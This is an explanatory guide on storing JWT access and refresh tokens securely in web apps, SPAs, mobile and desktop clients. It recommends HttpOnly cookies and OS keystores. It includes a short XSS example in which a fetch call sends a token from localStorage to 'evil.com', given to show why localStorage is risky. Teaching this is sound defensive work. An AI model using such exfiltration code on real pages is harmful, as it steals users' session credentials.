This is one of the most important questions in web authentication.

The answer depends on **what type of client** you have.

There is **no single best place** to store JWTs. The safest choice depends on whether you're building:

1. Traditional web application (server-rendered)
2. Single Page Application (React/Vue/Angular)
3. Mobile app (Android/iOS)
4. Desktop application

Let's go through each one like a production architect would.

---

# First understand the two tokens

Usually you have

```
Access Token
```

* Short lived
* 5-15 minutes
* Used on every API request

and

```
Refresh Token
```

* Long lived
* Days or months
* Used only to obtain new access tokens

Think of it like this

```
Access Token
=
Temporary ID card

Refresh Token
=
Passport locked in a safe
```

The refresh token is MUCH more valuable.

---

# 1. Traditional Web Application

Example

```
Amazon
Bank Website
Government Portal
```

The browser talks directly to the backend.

The recommended production setup is

```
Browser

Cookies

↓

Backend
```

Store

```
Access Token
↓

HttpOnly Cookie

Refresh Token
↓

HttpOnly Cookie
```

Cookies should be

```
HttpOnly
Secure
SameSite=Lax or Strict
```

Example

```
Set-Cookie:
access_token=...
HttpOnly
Secure
SameSite=Lax

Set-Cookie:
refresh_token=...
HttpOnly
Secure
SameSite=Strict
```

### Why?

Because JavaScript cannot read HttpOnly cookies.

Even if someone injects

```javascript
alert(document.cookie)
```

they get

```
Nothing
```

because HttpOnly blocks JavaScript access.

---

# Why cookies?

Browser automatically sends them.

```
Browser

↓

GET /profile

Cookie:
access_token=...
```

Developer doesn't need to manually attach tokens.

---

# 2. SPA (React/Vue/Angular)

This is where many beginners get confused.

Suppose

```
React
↓

FastAPI
```

There are three common approaches.

---

## Option 1 (Recommended)

Store BOTH in HttpOnly cookies.

```
Browser

HttpOnly Cookie
```

React never sees the tokens.

Flow

```
React

↓

fetch("/api/profile", {
    credentials: "include"
})
```

Browser automatically sends cookies.

Server validates them.

React doesn't know the token exists.

This is currently considered the safest approach for browser-based SPAs in many production systems.

---

## Option 2

Access token

```
Memory
```

Refresh token

```
HttpOnly Cookie
```

Flow

```
Login

↓

Server

↓

access token
(returned in JSON)

refresh token
(HttpOnly Cookie)
```

React stores

```
Access Token

RAM only
```

Not

```
localStorage

NOT sessionStorage
```

When access expires

```
React

↓

POST /refresh

↓

Browser sends refresh cookie

↓

New access token

↓

React stores again in RAM
```

This is also a widely used pattern because the access token disappears when the tab is closed, reducing persistence if malicious code ever gains access to the page.

---

## Option 3 (Not Recommended)

Store

```
localStorage
```

```
localStorage.setItem(...)
```

Why?

Because

```
JavaScript
```

can read it.

If XSS occurs

```javascript
fetch("https://evil.com", {
 body:
 localStorage.getItem("jwt")
})
```

Game over.

---

# Why people still use localStorage?

Because it is easy.

```
axios.interceptors.request.use(...)
```

Read

```
localStorage
```

Attach Authorization header.

Done.

Simple.

But less secure.

---

# sessionStorage?

Slightly better.

```
Dies when tab closes
```

But

JavaScript can still read it.

So XSS still steals it.

---

# Memory storage

Example

```javascript
let accessToken = null;
```

or

```
React Context

Redux

Zustand
```

Token disappears when page refreshes.

Safer.

---

# Mobile Apps

Android

iOS

Never use

```
SharedPreferences
```

or

```
NSUserDefaults
```

for long-term token storage without platform security features.

Instead

### Android

Store refresh token in

```
Android Keystore
```

or use encrypted storage backed by it.

### iPhone

Store refresh token in

```
iOS Keychain
```

Access token can be

```
Memory
```

Refresh token

```
Keychain / Keystore
```

This is the common production setup.

---

# Desktop Applications

Windows

```
Credential Manager
```

macOS

```
Keychain
```

Linux

```
Secret Service / Keyring
```

Never plain text files.

---

# Why separate Access and Refresh Tokens?

Imagine

```
Access Token
15 min

Refresh Token
30 days
```

If attacker steals access token

```
Maximum damage

15 minutes
```

If attacker steals refresh token

```
They can keep getting new access tokens

for weeks
```

That's why refresh token gets stronger protection.

---

# Production recommendation summary

| Platform                | Access Token                  | Refresh Token                                                    | Recommended?                                                             |
| ----------------------- | ----------------------------- | ---------------------------------------------------------------- | ------------------------------------------------------------------------ |
| Traditional Web App     | HttpOnly Secure Cookie        | HttpOnly Secure Cookie                                           | ✅ Excellent                                                              |
| SPA (React/Vue/Angular) | HttpOnly cookie **or** memory | HttpOnly Secure Cookie                                           | ✅ Best practice                                                          |
| SPA                     | localStorage                  | localStorage                                                     | ❌ Avoid                                                                  |
| SPA                     | sessionStorage                | sessionStorage                                                   | ⚠️ Better than localStorage for persistence, but still vulnerable to XSS |
| Android                 | Memory                        | Keystore-backed secure storage                                   | ✅ Best practice                                                          |
| iOS                     | Memory                        | Keychain                                                         | ✅ Best practice                                                          |
| Desktop                 | Memory                        | OS credential store (Keychain/Credential Manager/Secret Service) | ✅ Best practice                                                          |

# One important clarification

Many tutorials say:

> "JWTs should never be stored in cookies."

This is misleading.

The real guidance is:

* **Do not store JWTs in cookies that JavaScript can freely read and modify.**
* **It is perfectly acceptable—and very common in production—to store JWTs in `HttpOnly`, `Secure` cookies**, especially for web applications and SPAs.

The trade-off is that cookie-based authentication requires protecting against CSRF (using `SameSite` cookies, CSRF tokens where appropriate, or both), while header-based authentication with tokens in JavaScript-accessible storage avoids CSRF but increases exposure to XSS. Modern production systems generally choose the approach that best fits their architecture while minimizing the more significant risks.
